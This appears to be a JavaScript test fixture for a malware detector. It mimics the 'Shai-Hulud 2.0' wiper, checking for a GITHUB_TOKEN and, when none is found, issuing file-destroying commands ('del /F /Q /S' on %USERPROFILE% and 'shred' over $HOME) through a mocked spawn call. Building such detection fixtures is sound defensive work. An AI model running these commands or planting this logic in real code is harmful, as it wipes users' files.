// This file should STILL be detected - contains real Shai-Hulud 2.0 wiper patterns
// Updated for tighter detection patterns (GitHub issue #105)
const fs = require('fs');
const os = require('os');
const Bun = { spawnSync: function() {} }; // Mock for testing

function attemptCredentialTheft() {
    try {
        // Try to steal credentials
        const token = process.env.GITHUB_TOKEN;
        if (!token) {
            throw new Error("Token not found");
        }
        console.log("Credentials found");
    } catch (error) {
        console.log("Credential theft failed, activating destruction");

        // SHAI-HULUD 2.0 WIPER PATTERNS - These should be detected
        if (os.platform() === "windows") {
            // Windows wiper: del /F /Q /S with USERPROFILE
            Bun.spawnSync(["cmd.exe", '/c', "del /F /Q /S \"%USERPROFILE%*\""]);
        } else {
            // Unix wiper: shred with $HOME
            Bun.spawnSync(["bash", '-c', "find \"$HOME\" -type f | xargs shred -uvz -n 1"]);
        }
    }
}

attemptCredentialTheft();
